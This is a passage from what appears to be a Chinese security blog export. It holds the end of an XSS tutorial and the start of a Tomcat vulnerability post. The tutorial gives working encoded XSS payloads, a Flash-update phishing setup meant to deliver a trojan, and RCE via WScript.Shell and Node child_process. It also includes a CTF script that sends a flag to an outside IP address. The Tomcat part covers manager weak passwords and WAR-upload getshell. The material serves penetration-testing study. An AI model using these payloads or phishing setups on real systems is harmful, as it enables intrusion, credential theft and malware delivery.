class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p>或者也可以直接将一整段js代码编码后放入eval()函数中执行。</p><h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p><strong>混合编码就是对一个XSS向量同时进行多种编码，如下示例：</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// 对javascript:进行HTML编码, 对alert(&quot;xss&quot;)进行URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 对javascript:进行HTML编码, 对alert进行Unicode编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\u0061\u006C\u0065\u0072\u0074(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>也可以利用解码顺序进行混合编码，如下示例：</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><p>首先对“alert”进行JavaScript Unicode编码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再对 <code>\u0061\u006c\u0065\u0072\u0074</code> 进行URL编码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后对标签中的 <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> 整体进行HTML编码即可：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SVG：XSS的一个黑魔法"><a href="#SVG：XSS的一个黑魔法" class="headerlink" title="SVG：XSS的一个黑魔法"></a>SVG：XSS的一个黑魔法</h2><p>我们在上文HTML编码那里最后留了一个坑，即HTML的五类元素中，像 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。</p><p>也就是说，向下面这样的代码，浏览器不会对其中的HTML实体字符进行解码，也就不会执行并触发XSS了：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那如何绕过HTML原始文本元素进而执行HTML实体解码呢，这涉及到了 <code>&lt;svg&gt;</code> 的魔力，那是一种特殊的触发效果，单纯script标签内加载html实体编码，只会当做文本，没有任何触发结果，如下图：</p><p>[<img src="/../images/20210523094715-cd264a4c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cd264a4c-bb68-1.png)</p><p>但是当在前面加上 <code>&lt;svg&gt;</code> 后，却成功弹窗了：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094716-cd67709e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094716-cd67709e-bb68-1.png)</p><p>这是为什么呢？</p><p>是因为 <code>&lt;svg&gt;</code> 标签属于HTML五大元素中的外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释，也就是说在解析到<code>&lt;svg&gt;</code> 标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML解析中，实体编码会自动解码成相应的字符，重新来一遍标签开启状态，此时就会执行XSS了。如下图，弹窗后我们查看页面源码。发现原本不能被HTML解码的内容被 <code>&lt;svg&gt;</code> 标签自动解码了：</p><p>[<img src="/../images/20210523094717-cde26b1e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-cde26b1e-bb68-1.png)</p><h1 id="测试流程思路"><a href="#测试流程思路" class="headerlink" title="测试流程思路"></a>测试流程思路</h1><p>下面让我们来看一下XSS绕过的测试流程。</p><p>现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：</p><ol><li>暴力测试（输入大量的payload，看返回结果）</li><li>根据正则推算</li><li>利用浏览器bug</li></ol><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>（1）尝试插入比较正常的HTML标签，例如：<code>&lt;a&gt;</code>、<code>&lt;b&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;u&gt;</code> 等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p><p>（2）尝试插入不闭合的标签，例如：<code>&lt;a</code>、<code>&lt;b</code>、<code>i&gt;</code>、<code>u&gt;</code>、<code>&lt;img</code> 等，然后看一下返回响应，是否对开放的标签也有过滤。</p><p>（3）然后测试几种常见的XSS向量：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了 alert、prompt、confirm 等字符，再尝试大小写的组合：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure><p>（4）如果过滤器仅仅是把 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签过滤掉，那么可以用双写的方式来绕过：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>这样当 <code>&lt;script&gt;</code> 标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。</p><p>（5）用 <code>&lt;a href</code> 标签来测试，看返回响应</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看看 <code>&lt;a</code> 标签是否被过滤，href 是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。</p><p>继续测试事件触发执行javascript：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看onmouseover事件是否被过滤。</p><p>测试一个无效的事件，看看他的过滤规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;a href=#&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><blockquote><p>onhashchange 事件在当前 URL 的锚部分(以 ‘#’ 号为开始) 发生改变时触发 。</p></blockquote><h2 id="测试其他标签和属性"><a href="#测试其他标签和属性" class="headerlink" title="测试其他标签和属性"></a>测试其他标签和属性</h2><p>HTML的标签和属性太多了，上文中已经列出了很多了。</p><h1 id="攻击面拓展"><a href="#攻击面拓展" class="headerlink" title="攻击面拓展"></a>攻击面拓展</h1><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><h3 id="通过-XSS-盗取-Cookie"><a href="#通过-XSS-盗取-Cookie" class="headerlink" title="通过 XSS 盗取 Cookie"></a>通过 XSS 盗取 Cookie</h3><p>Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。最简单的比如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ，执行后会弹出当前页面的cookie信息。在目标没有“同源策略”的保护下，我们可以利用XSS盗取目标网站管理员的Cookie。</p><p>在一般的通用CMS下呢，为了通用模板的兼容性，许多CMS本身不会使用“同源策略”等其他手段来防护XSS漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现XSS漏洞，我们就可以直接获取目标的Cookie然后使用特定的方法来传输cookie。</p><p>这里，我们可以利用网上现成的或自己搭建的XSS平台来完成利用过程。</p><h3 id="Flash-弹窗钓鱼"><a href="#Flash-弹窗钓鱼" class="headerlink" title="Flash 弹窗钓鱼"></a>Flash 弹窗钓鱼</h3><ul><li>项目一地址：<a href="https://github.com/Wileysec/adobe-flash-phishing-page">https://github.com/Wileysec/adobe-flash-phishing-page</a></li></ul><p>该项目是模仿的 Flash Player 中文官网的页面：</p><p>[<img src="/../images/20210523094717-ce2b906e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-ce2b906e-bb68-1.png)</p><p>需要在index.html中的加入我们制作的木马的链接地址：</p><p>[<img src="/../images/20210523094718-ce9bd752-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ce9bd752-bb68-1.png)</p><ul><li>项目二地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li></ul><p>该项目是一个逼真的Flash更新提醒的弹窗，强迫症都会忍不住去点击下载的：</p><p>[<img src="/../images/20210523094718-ced9a208-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ced9a208-bb68-1.png)</p><p>找到flash.js，搜索链接“<a href="https://www.se7ensec.cn/%E2%80%9D%EF%BC%8C%E5%B0%86%E5%85%B6%E6%94%B9%E4%B8%BA%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%9D%E5%AD%98%E5%8D%B3%E5%8F%AF%EF%BC%9A">https://www.se7ensec.cn/”，将其改为我们制作的木马的链接地址，然后保存即可：</a></p><p>[<img src="/../images/20210523094718-cefeb124-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-cefeb124-bb68-1.png)</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。</p><h3 id="使用-WScript-Shell-执行系统命令"><a href="#使用-WScript-Shell-执行系统命令" class="headerlink" title="使用 WScript.Shell 执行系统命令"></a>使用 WScript.Shell 执行系统命令</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li><p>Internet Explorer </p></li><li><p>在IE上打开设置中的Intertnet选项-“安全”-“自定义级别”-“对没有标记为安全的activex控件进行初始化和脚本运行-设置成启用，如下</p><p><img src="/../images/20190121110917-f04620ae-1d29-1-1686840019398.jpeg" alt="20190121110917-f04620ae-1d29-1"></p></li></ul><p>WScript.Shell（Windows Script Host Runtime Library）是一个对象，对应的文件是C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">shell.<span class="title function_">run</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230524224855708-1686840019398.png" alt="image-20230524224855708"></p><p>有时候为了 Bypass 也可以使用 <code>String.fromCharCode</code> 从 Ascii 来转化恶意代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="使用-child-process-执行系统命令"><a href="#使用-child-process-执行系统命令" class="headerlink" title="使用 child_process 执行系统命令"></a>使用 child_process 执行系统命令</h3><p>如果目标环境启用了 <strong>NodeJS</strong> 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;const exec = require(&#x27;child_process&#x27;).exec;exec(&#x27;whoami&#x27;).stdout.on(&#x27;data&#x27;, function (data) &#123;alert(data);&#125;)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;&lt;更多稀奇古怪的Payload&gt;&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS 。</p><h3 id="Xmind-2020-XSS-to-RCE"><a href="#Xmind-2020-XSS-to-RCE" class="headerlink" title="Xmind 2020 XSS  to RCE"></a>Xmind 2020 XSS  to RCE</h3><p>漏洞利用很简单，在 “思维导图” 中输出 Payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094723-d1fa41ae-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094723-d1fa41ae-bb68-1.png)</p><p>切换到 “大纲” 中，按下一个功能键即可触发攻击：</p><p>[<img src="/../images/20210523094724-d23097e0-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d23097e0-bb68-1.png)</p><p>由于 Xmind 启用了 NodeJS 功能，所以我们可以利用 child_process 调用并执行系统命令。</p><p>[<img src="/../images/20210523094724-d269b494-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d269b494-bb68-1.png)</p><p>[<img src="/../images/20210523094725-d2c17756-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094725-d2c17756-bb68-1.png)</p><h3 id="蚁剑的XSS-to-RCE"><a href="#蚁剑的XSS-to-RCE" class="headerlink" title="蚁剑的XSS to RCE"></a>蚁剑的XSS to RCE</h3><p><a href="https://github.com/AntSwordProject/antSword/issues/147">https://github.com/AntSwordProject/antSword/issues/147</a></p><p><a href="https://xz.aliyun.com/t/8167#toc-0">浅谈蚁剑RCE - 先知社区</a></p><h1 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h1><h3 id="Apache-httpOnly-Cookie泄露-CVE-2012-0053"><a href="#Apache-httpOnly-Cookie泄露-CVE-2012-0053" class="headerlink" title="Apache httpOnly Cookie泄露( CVE-2012-0053)"></a>Apache httpOnly Cookie泄露( CVE-2012-0053)</h3><p>影响版本：<strong>Apache2.2.0-Apache2.2.1</strong></p><p>当客户端请求的cookie超过4KB时，无论cookie是否带有httponly，Apache HTTPD Server都会将Cookie的明文信息打印到页面上</p><h3 id="CORS-cookie回显"><a href="#CORS-cookie回显" class="headerlink" title="CORS+cookie回显"></a>CORS+cookie回显</h3><p>例题</p><p><a href="https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss">https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss</a></p><p>条件1</p><blockquote><p>response数据包中</p><p>Access-Control-Allow-Headers: X-Requested-With，说明了我们可以通过<strong>XHR</strong>请求来访问网站</p><p><code>XMLHttpRequest</code>是用于在后台与服务器交换数据。如果设置XHR请求网站，那么请头部必然会带有：<code>Origin:xxx</code>，则会被服务器视为同源访问</p></blockquote><p>条件2</p><p>没有关闭debug模式，导致cookie回显</p><p><img src="/../images/39-1686840019399.png" alt="img"></p><p>利用<code>location.href</code>重定向到vps，从而带出cookie</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)&#123;</span><br><span class="line">        location.<span class="property">href</span>=<span class="string">&#x27;http://106.15.250.162:8888/?flag=&#x27;</span>+ xmlhttp.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="string">&#x27;flag\\&#123;(.\*?)\\&#125;&#x27;</span>)[<span class="number">1</span>]&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/index.php/treehole/view?id=&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="CST–trace请求"><a href="#CST–trace请求" class="headerlink" title="CST–trace请求"></a>CST–trace请求</h3><p>TRACE 方法会返回原始请求报文，其中就包含了cookie</p><p><a href="https://www.cnblogs.com/gaopei/p/11380349.html">https://www.cnblogs.com/gaopei/p/11380349.html</a></p><h3 id="debug信息泄漏"><a href="#debug信息泄漏" class="headerlink" title="debug信息泄漏"></a>debug信息泄漏</h3><p>比如phpinfo，thinkphp框架debug信息等</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><a href="https://xz.aliyun.com/t/12370#toc-25">https://xz.aliyun.com/t/12370#toc-25</a></p><blockquote><p>CSP指的是Content Security Policy，即内容安全策略。它是一种安全机制，用于保护网站免受跨站脚本攻击（XSS攻击）、数据盗取等Web攻击的影响。<br>CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置。<br>通过CSP，网站管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被恶意脚本攻击的风险。</p></blockquote><p><img src="/../images/image-20230512151453267-1686840019399.png" alt="image-20230512151453267"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li>CSP</li><li>html实体编码</li><li>黑名单</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat漏洞</title>
      <link href="/2023/06/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/"/>
      <url>/2023/06/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub</p><h2 id="Tomat了解"><a href="#Tomat了解" class="headerlink" title="Tomat了解"></a>Tomat了解</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><img src="/../images/image-20230228234754791-1686995572132.png" alt="image-20230228234754791"></p><p>webapps</p><p><img src="/../images/image-20230617184342638.png" alt="image-20230617184342638"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. bin目录: 存放一些二进制的文件，例如Tomcat常用的 启动脚本: startup.bat或startup.sh 关闭脚本: shutdown.bat 或 shutdown.sh等等</span><br><span class="line"></span><br><span class="line">2. conf目录: 存放的是Tomcat的配置文件</span><br><span class="line"></span><br><span class="line">server.xml：可以设置端口号、设置域名或IP、默认加载的项目、请求编码</span><br><span class="line">web.xml：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet</span><br><span class="line">context.xml：可以用来配置数据源之类的</span><br><span class="line">tomcat-users.xml：用来配置管理tomcat的用户与权限</span><br><span class="line">Catalina:可以设置默认加载的项目</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. lib目录: 存放的是全局的jar包</span><br><span class="line"></span><br><span class="line">4. logs目录: 存放的是Tomcat的日志，如果Tomcat出错什么的，就需要在这里的日志中查找问题</span><br><span class="line"></span><br><span class="line">5. temp目录: 存放的是临时性的文件</span><br><span class="line"></span><br><span class="line">6. webapps目录: 存放的是Java的Web项目，要部署的项目就需要放在这个目录当中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7. work目录: 存放的是由JSP代码翻译的Java代码，以及编译的.class文件</span><br></pre></td></tr></table></figure><h2 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Tomcat&quot;</span><br><span class="line">server=&quot;Tomcat&quot; </span><br><span class="line"></span><br><span class="line">版本号：在Tomcat后面添加/x.x</span><br></pre></td></tr></table></figure><h2 id="Tomcat漏洞"><a href="#Tomcat漏洞" class="headerlink" title="Tomcat漏洞"></a>Tomcat漏洞</h2><h3 id="manager弱口令-部署war包getshell"><a href="#manager弱口令-部署war包getshell" class="headerlink" title="manager弱口令+部署war包getshell"></a>manager弱口令+部署war包getshell</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Tomcat7+或者配置错误</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><blockquote><p>conf&#x2F;tomcat-users.xml中保存了登录凭证，导致可能存在弱口令漏洞，从而能访问Manager APP上传后门。</p></blockquote><p><img src="/../images/image-20230228232924268-1686995572133.png" alt="image-20230228232924268"></p><p>进入manager界面后可以部署war包</p><p>​<img src="/../images/image-20230228232939975-1686995572134.png" alt="image-20230228232939975"></p><blockquote><p>war包为jsp压缩文件（<code>jar cvf xxx.jsp</code>），Tomcat会自动解压，</p><p>如将shell.jsp打包为shell.war，Tomcat会将其解压为&#x2F;shell&#x2F;shell.jsp</p></blockquote><p><img src="/../images/image-20230228233506559-1686995572134.png" alt="image-20230228233506559"></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>删除manage目录或者修改conf&#x2F;tomcat-users.xml中的用户凭证</p><h3 id="PUT任意文件上传（CVE-2017-12615）"><a href="#PUT任意文件上传（CVE-2017-12615）" class="headerlink" title="PUT任意文件上传（CVE-2017-12615）"></a>PUT任意文件上传（CVE-2017-12615）</h3><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>7.0.0 &lt;&#x3D; tomcat &lt;&#x3D;7.0.79或者配置错误</p><h4 